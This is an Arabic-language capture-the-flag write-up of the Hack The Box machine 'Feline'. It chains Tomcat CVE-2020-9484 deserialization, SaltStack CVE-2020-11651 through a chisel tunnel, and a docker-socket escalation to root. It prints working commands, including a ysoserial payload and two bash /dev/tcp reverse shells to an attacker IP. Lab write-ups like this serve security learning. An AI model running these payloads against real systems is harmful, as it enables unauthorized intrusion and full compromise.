

 ![Desktop View](/img/fl/0.png)


_Sammmry:_

```
htbتحدي صعب من Feline
 نجد في البداية ان السيرفر
Cve 2020-9484 مصاب ب 
  user نقوم باستغلالها للحصول على      
CVE-2020-11651  ثم نستغل  
docker.sock  ثم نجد في
برفع root نتمكن من الحصول على.bash_history docker binary
```

- Sammmry
- 1 Enumeration
   - 1.1 Nmap
   - 1.2 Port
   - 1.3 Cve 2020-9484
- 2 user
   - 2.1 Tomcat shell
   - 2.2 CVE- 2020-11651
      - 2.2.1 port forwarding with chisel
- 3 User.txt
- 4 Root privilege escalation
   - 4.1 .bash hisroty
   - 4.2 docker


## 1 Enumeration

### 1.1 Nmap

nmap نبدا بفحص البورتات باستخدام


![Desktop View](/img/fl/1.png)


### 1.2 Port


8080  نجد بورت 

![Desktop View](/img/fl/2.png)

### 1.3 Cve 2020-9484


cve- 2020 - 9484 بعد فحص السيرفر نجد انه مصاب ب


https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/

payload:
```
filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,$(echo -n bash -c 'bash
-i >& /dev/tcp/10.10.14.212/5555 0>&1' | base64)}|{base64,-d}|{bash,-i}" >
/tmp/$filename.session
curl -s -F "data=@/tmp/$filename.session"
http://10.10.10.205:8080/upload.jsp?email=test@mail.com > /dev/null
curl -s http://10.10.10.205:8080/ -H "Cookie:
JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null
```

: من هنا ysoserial حمل

https://github.com/frohoff/ysoserial

ncونشغل ysoerial في مجلد payload نقوم بوضع



![Desktop View](/img/fl/3.png)
## 2 user

### 2.1 Tomcat shell


tomcat بصلاحيات shell حصلنا على

![Desktop View](/img/fl/4.png)

 نكتب الامر التالي لنرى البورتات المفتوحة في الجهاز
```
netstat –plant
```

 ![Desktop View](/img/fl/4.2.png)
### 2.2 CVE-2020-11651

 و 4505port 4506 نجد 


مفتوحين عند البحث في جوجل نكتشف 

rce وهو مصاب ب SaltStack ان هذه البورتات خاصة ب



نقوم بتحميل الاستغلال من هنا


https://github.com/jasperla/CVE-2020-11651-poc/blob/master/exploit.py

### 2.2.1 port forwarding with chisel


4506 portل port forwardingمن اجل chisel نجهز


## 3 User.txt


الخاص بنا localhost اي نحوله الى

على السيرفر chisel نقوم برفع

```
sudo python -m SimpleHTTPServer 80
wget http://10.10.14.212/chisel

```
 ![Desktop View](/img/fl/5.png)

نكتب الامر التالي في جهازنا chisel بعد رفع
```
./chisel server -p 5556 --reverse -v
```
: ونكتب الامر التالي في السيرفر
```
./chisel client 10.10.14.212:5556 R:4506:127.0.0.1:

```
 ![Desktop View](/img/fl/6.png)

الان نقوم ب الاستغلال

على جهازك nc شغل
```
nc –lnvp 8080
```

```
python3 exploit.py --master 127.0.0.1 --exec 'bash -c "bash -i >&
/dev/tcp/10.10.14.212/8080 0>&1"'
```
 10.10.14.212 غير

الخاص بك ip الى ال


 ![Desktop View](/img/fl/7.png)


## 4 Root privilege escalation

### 4.1 .bash hisroty

.bash_history نجد في


curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

### 4.2 docker

على السيرفر docker binary نقوم برفع

يمكنك تحميله من هنا

https://download.docker.com/linux/static/stable/x86_64

 ![Desktop View](/img/fl/8.png)


rootثم نكتب الاومر التالية لنحصل على
```
docker images
./docker run -v /root/:/mnt -it sandbox
```

 ![Desktop View](/img/fl/9.png)


